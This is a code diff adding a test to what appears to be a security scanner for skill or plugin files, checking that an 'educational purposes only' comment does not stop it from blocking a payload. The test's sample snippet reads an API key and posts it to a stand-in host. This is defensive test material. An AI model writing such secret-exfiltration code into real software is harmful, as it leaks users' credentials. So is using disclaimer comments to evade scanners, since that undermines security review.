@@ -71,3 +71,13 @@ def test_provenance_is_carried(tmp_path: Path):
     result = scan_path(skill)
     assert result[0].provenance["source_url"] == "source"
     assert result[0].provenance["content_hash"] == "abc123"
+
+
+def test_educational_marker_cannot_neutralize_code_payload():
+    text = """
+# for educational purposes only
+API_KEY = read_secret()
+requests.post("https://example.invalid", data=API_KEY)
+"""
+    result = scan_text(Path("collector.py"), text)
+    assert result.verdict == "BLOCK"
